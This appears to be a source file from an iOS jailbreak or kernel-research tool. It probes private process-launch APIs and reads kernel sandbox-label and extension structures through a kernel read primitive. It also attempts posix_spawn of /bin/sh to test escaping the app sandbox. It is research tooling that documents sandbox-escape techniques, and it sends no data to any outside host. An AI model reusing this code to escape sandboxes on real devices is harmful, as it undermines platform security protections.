            // D1: openURL: — CONFIRMED WORKS (opened Settings in earlier run)
            // Do NOT call it — it steals focus and kills our test.
            // Just probe method availability.
            bc("[SWAP] D1: openURL probe\n");
            buf_append("\n  D1: openURL: (PROBE ONLY — calling steals focus)\n");
            SEL openURLSel = NSSelectorFromString(@"openURL:");
            buf_append("  openURL: responds: %s\n",
                [workspace respondsToSelector:openURLSel] ? "YES" : "NO");
            buf_append("  >>> CONFIRMED WORKING in prior test (opened Settings) <<<\n");

            // Also check canOpenURL:
            SEL canOpenSel = NSSelectorFromString(@"canOpenURL:");
            buf_append("  canOpenURL: responds: %s\n",
                [workspace respondsToSelector:canOpenSel] ? "YES" : "NO");
            if ([workspace respondsToSelector:canOpenSel]) {
                // Test with a fake custom scheme — won't open anything
                NSURL *fakeURL = [NSURL URLWithString:
                    @"jbexec://run"];
                @try {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                    id result = [workspace performSelector:canOpenSel
                        withObject:fakeURL];
#pragma clang diagnostic pop
                    buf_append("  canOpenURL(jbexec://run): %s\n",
                        result ? "YES" : "NO");
                } @catch (NSException *e) {
                    buf_append("  EXCEPTION: %s\n",
                        [[e name] UTF8String]);
                }
            }

            // D2: openSensitiveURL:withOptions: — probe only
            bc("[SWAP] D2: openSensitiveURL\n");
            buf_append("\n  D2: openSensitiveURL:withOptions:\n");
            SEL sensURLSel = NSSelectorFromString(
                @"openSensitiveURL:withOptions:");
            buf_append("  responds: %s\n",
                [workspace respondsToSelector:sensURLSel] ? "YES" : "NO");
            // NOT calling — tel: would open Phone app

            // D3: Enumerate URL-related methods
            buf_append("\n  D3: URL-related methods on workspace:\n");
            unsigned int mc = 0;
            Method *ms = class_copyMethodList([workspace class], &mc);
            for (unsigned int i = 0; i < mc; i++) {
                const char *name = sel_getName(method_getName(ms[i]));
                if (strstr(name, "URL") || strstr(name, "Url") ||
                    strstr(name, "url") || strstr(name, "scheme")) {
                    buf_append("    - %s\n", name);
                }
            }
            if (ms) free(ms);
        }
    }

    // ══════════════════════════════════════════════════════════════
    // TEST E: BKSSystemService (BackBoardServices)
    // Alternative to FBS — BackBoard handles lower-level display
    // and process management. May have different entitlement checks.
    // ══════════════════════════════════════════════════════════════
    bc("[SWAP] Test E: BKSSystemService\n");
    buf_append("\n-- Test E: BKSSystemService --\n");
    {
        Class bksClass = NSClassFromString(@"BKSSystemService");
        buf_append("  BKSSystemService: %p\n", bksClass);
        if (bksClass) {
            SEL sharedSvcSel = NSSelectorFromString(@"sharedService");
            id bksSvc = nil;
            if ([bksClass respondsToSelector:sharedSvcSel]) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
                bksSvc = [bksClass performSelector:sharedSvcSel];
#pragma clang diagnostic pop
            }
            buf_append("  instance: %p\n", bksSvc);

            if (bksSvc) {
                unsigned int mc = 0;
                Method *ms = class_copyMethodList([bksSvc class], &mc);
                buf_append("  Methods (%u):\n", mc);
                for (unsigned int i = 0; i < mc && i < 30; i++) {
                    buf_append("    - %s\n",
                        sel_getName(method_getName(ms[i])));
                }
                if (ms) free(ms);
            }

            // Also check BKSProcessAssertion — might help keep procs alive
            Class bksPA = NSClassFromString(@"BKSProcessAssertion");
            buf_append("  BKSProcessAssertion: %p\n", bksPA);
        } else {
            buf_append("  NOT FOUND\n");
        }
    }

    // ══════════════════════════════════════════════════════════════
    // TEST F: Kernel sandbox extension injection
    // Check if we can find sandbox extension structures via kread
    // and potentially add a process-exec extension at kernel level.
    // This probes the data structures — no write yet.
    // ══════════════════════════════════════════════════════════════
    bc("[SWAP] Test F: sandbox extension kernel\n");
    buf_append("\n-- Test F: Kernel sandbox extension structures --\n");
    {
        uint64_t self_proc = proc_self();
        proc_info_t self_info;
        if (self_proc && gather_proc_info(self_proc, &self_info) == 0) {
            buf_append("  proc: 0x%llx\n", self_info.proc);
            buf_append("  ucred: 0x%llx\n", self_info.ucred);
            buf_append("  sandbox: 0x%llx\n",
                self_info.sandbox);

            if (self_info.sandbox) {
                // Read the first 128 bytes of sandbox structure
                // to understand its layout
                uint8_t labelData[128];
                for (int i = 0; i < 128; i += 8) {
                    uint64_t val = kread64(self_info.sandbox + i);
                    memcpy(&labelData[i], &val, 8);
                }

                buf_append("  sandbox_label raw (first 128 bytes):\n");
                for (int i = 0; i < 128; i += 16) {
                    buf_append("    +%02x: ", i);
                    for (int j = 0; j < 16 && (i+j) < 128; j++) {
                        buf_append("%02x ", labelData[i+j]);
                    }
                    buf_append("\n");
                }

                // Look for pointers in the structure — sandbox
                // extensions might be a linked list hanging off the label
                buf_append("\n  Pointer-sized values in sandbox_label:\n");
                for (int i = 0; i < 128; i += 8) {
                    uint64_t val;
                    memcpy(&val, &labelData[i], 8);
                    if (val > 0xffff000000000000ULL ||
                        (val > 0x100000000ULL && val < 0x800000000000ULL)) {
                        buf_append("    +%02x: 0x%016llx (looks like ptr)\n",
                            i, val);
                        // Read 16 bytes at that pointer to peek
                        uint64_t peek1 = kread64(val);
                        uint64_t peek2 = kread64(val + 8);
                        buf_append("      -> 0x%016llx 0x%016llx\n",
                            peek1, peek2);
                    }
                }
            }
        } else {
            buf_append("  FAILED to read proc info\n");
        }
    }

    buf_append("\n-- v14 Analysis --\n");
    buf_append("v14 TESTED:\n");
    buf_append("  A: FBSOpenApplicationService (service handles)\n");
    buf_append("  B: NSTask with own binary + container script\n");
    buf_append("  C: SBS C functions (SBSLaunchApplication etc)\n");
    buf_append("  D: URL-based launch (openURL, openSensitiveURL)\n");
    buf_append("  E: BKSSystemService (BackBoard)\n");
    buf_append("  F: Kernel sandbox_label structure probe\n");

    bc("[SWAP] v14 complete\n");
    bc_close();
    return buf_finish();
}

char *kresearch_add_exec_extension(void) {
    buf_init();
    buf_append("=== ADD PROCESS-EXEC EXTENSION (EXPERIMENTAL) ===\n\n");
    buf_append("NOTE: Sandbox extensions are class-based. Process-exec may not\n");
    buf_append("use the extension mechanism. Testing anyway...\n\n");

    // This is speculative — the sandbox may not check extensions for process-exec.
    // The filesystem escape works because file-read/write-data operations check
    // the extension set. Process operations might be profile-only.

    proc_info_t self_info;
    gather_proc_info(proc_self(), &self_info);

    if (!kaddr_ok(self_info.extension_set)) {
        buf_append("ERROR: No extension set found\n");
        return buf_finish();
    }

    buf_append("Extension set at: 0x%llx\n", self_info.extension_set);

    // Check current sandbox state for process-exec
    pid_t pid = getpid();
    int exec_check = sandbox_check(pid, "process-exec",
                                    SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
                                    "/bin/sh");
    buf_append("Current process-exec status: %s\n",
               exec_check == 0 ? "ALLOWED" : "BLOCKED");

    if (exec_check == 0) {
        buf_append("Already allowed — nothing to do!\n");
        return buf_finish();
    }

    // Enumerate all extension buckets to understand the structure
    buf_append("\nCurrent extension buckets:\n");
    for (int i = 0; i < 9; i++) {
        uint64_t bucket = kread_ptr(self_info.extension_set + (i * 8));
        if (bucket && kaddr_ok(bucket)) {
            struct extension_class_node node = {0};
            kreadbuf(bucket, &node, sizeof(node));
            char name[128] = {0};
            if (kaddr_ok((uint64_t)node.class_name)) {
                kreadbuf((uint64_t)node.class_name, name, sizeof(name) - 1);
            }
            buf_append("  bucket[%d]: 0x%llx class=\"%s\" count=%llu\n",
                       i, bucket, name, (unsigned long long)node.count);

            // Walk extension list
            uint64_t ext = (uint64_t)node.ext_list_head;
            int j = 0;
            while (ext && kaddr_ok(ext) && j < 5) {
                struct extension e = {0};
                kreadbuf(ext, &e, sizeof(e));
                char path[128] = {0};
                if (kaddr_ok((uint64_t)e.data_ptr)) {
                    kreadbuf((uint64_t)e.data_ptr, path, sizeof(path) - 1);
                }
                buf_append("    ext: path=\"%s\" pathlen=%llu sc=%d\n",
                           path, (unsigned long long)e.path_len, e.file.storage_class);
                ext = (uint64_t)e.next;
                j++;
            }
        }
    }

    buf_append("\nTo add a process-exec extension, we would need to create a new\n");
    buf_append("extension_class_node for 'com.apple.sandbox.executable' and link it\n");
    buf_append("into the extension set. However, this requires allocating kernel memory\n");
    buf_append("for the new structures, which is complex with only kwrite.\n");
    buf_append("\nRecommendation: Try sandbox profile swap first (kresearch swap_profile).\n");

    return buf_finish();
}

char *kresearch_test_spawn(void) {
    buf_init();
    buf_append("=== POSIX_SPAWN TEST ===\n\n");

    // Check sandbox state
    pid_t pid = getpid();
    int exec_check = sandbox_check(pid, "process-exec",
                                    SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT,
                                    "/bin/sh");
    int fork_check = sandbox_check(pid, "process-fork", SANDBOX_CHECK_NO_REPORT);
    buf_append("sandbox process-exec /bin/sh: %s\n",
               exec_check == 0 ? "ALLOWED" : "BLOCKED");
    buf_append("sandbox process-fork: %s\n",
               fork_check == 0 ? "ALLOWED" : "BLOCKED");

    // Check our credentials
    buf_append("getuid()=%d geteuid()=%d\n", getuid(), geteuid());

    // Try posix_spawn with different binaries
    const char *binaries[] = {"/bin/sh", "/bin/echo", "/usr/bin/id", NULL};
    for (int i = 0; binaries[i]; i++) {
        buf_append("\nTrying posix_spawn(%s):\n", binaries[i]);

        pid_t child = 0;
        char *argv[] = {(char *)binaries[i], NULL};
        if (strcmp(binaries[i], "/bin/sh") == 0) {
            char *sh_argv[] = {"/bin/sh", "-c", "echo spawn_ok", NULL};
            argv[0] = sh_argv[0];
            // Can't reassign fixed array, do it inline
        }
        char *envp[] = {"PATH=/usr/bin:/bin:/usr/sbin:/sbin", NULL};

        posix_spawnattr_t attr;
        posix_spawnattr_init(&attr);

        char *spawn_argv[4];
        if (strcmp(binaries[i], "/bin/sh") == 0) {
            spawn_argv[0] = "/bin/sh";
            spawn_argv[1] = "-c";
            spawn_argv[2] = "echo spawn_ok";
            spawn_argv[3] = NULL;
        } else {
            spawn_argv[0] = (char *)binaries[i];
            spawn_argv[1] = NULL;
        }

        int ret = posix_spawn(&child, binaries[i], NULL, &attr, spawn_argv, envp);
        posix_spawnattr_destroy(&attr);

        if (ret == 0) {
            buf_append("  SUCCESS! PID=%d\n", child);
            int status = 0;
            waitpid(child, &status, 0);
            int exit_code = WIFEXITED(status) ? WEXITSTATUS(status) : -1;
            buf_append("  Exit code: %d\n", exit_code);
        } else {
            buf_append("  FAILED: %d (%s)\n", ret, strerror(ret));
            // Decode specific errno
            switch (ret) {
                case EPERM:
                    buf_append("  → EPERM: Operation not permitted (credential/sandbox issue)\n");
                    break;
                case ENOENT:
                    buf_append("  → ENOENT: Binary not found at path\n");
                    break;
                case EACCES:
                    buf_append("  → EACCES: Permission denied (filesystem access)\n");
                    break;
                case ENOEXEC:
                    buf_append("  → ENOEXEC: Not executable (code signing?)\n");
                    break;
                default:
                    break;
            }
        }
    }

    return buf_finish();
}
